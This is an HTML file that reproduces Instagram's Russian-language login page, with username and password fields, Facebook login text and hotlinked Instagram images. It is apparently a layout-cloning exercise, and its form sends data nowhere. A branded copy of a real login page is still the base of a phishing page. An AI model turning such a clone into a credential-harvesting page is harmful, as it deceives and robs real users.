<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <link rel="stylesheet" type="text/css" href="inst.css">
</head>
<body>

<div class="main">
    <div class="phone">
        <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=HOgRclNOosk">
    </div>
    <div class="box">
        <img class="inst-logo" src="8n91YnfPq0s.jpg">
        <div class="form-container">
            <form>
                <div class="input-container">
                    <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес">
                </div>
                <div class="input-container">
                    <input type="password" id="password" placeholder="Пароль">
                </div>
                <div class="input-container">
                    <input type="submit" value="Войти">
                </div>
            </form>
            <div class="line">
                <div class="separator"></div>
                <div class="or-text">или</div>
                <div class="separator"></div>
            </div>
        </div>
        <img class="fb" src="Facebook_Logo_(2019).png">
        <div><span class="fb-login">Войти через Facebook</span></div>
        <div><span class="stupid">Забыли пароль?</span></div>
    </div>
    <div class="under-box">
        <div><span class="relly">У вас ещё нет аккаунта?</span></div>
        <div><span class="register">Зарегистрироваться</span></div>

    </div>
    <h4 class="download-app">Установите приложение.</h4>
    <img alt="Скачать из Google Play" class="_aa5q"
         src="https://static.cdninstagram.com/rsrc.php/v3/yr/r/fDjwyLC88oO.png">
    <img alt="Скачать с сайта Microsoft" class="_aa6q"
         src="https://static.cdninstagram.com/rsrc.php/v3/yv/r/_UbeIRgTpG-.png">
</div>
<footer>
    <div class="footer-meta">
        <div class="footer-meta">
            <a href="#">Meta</a>
            <a href="#">Информация</a>
            <a href="#">Блог</a>
            <!-- Добавьте дополнительные ссылки по необходимости -->
        </div>
        <div class="footer-meta">
            <span>© 2024 Instagram from Meta</span>
        </div>
    </div>
</footer>
</body>
</html>
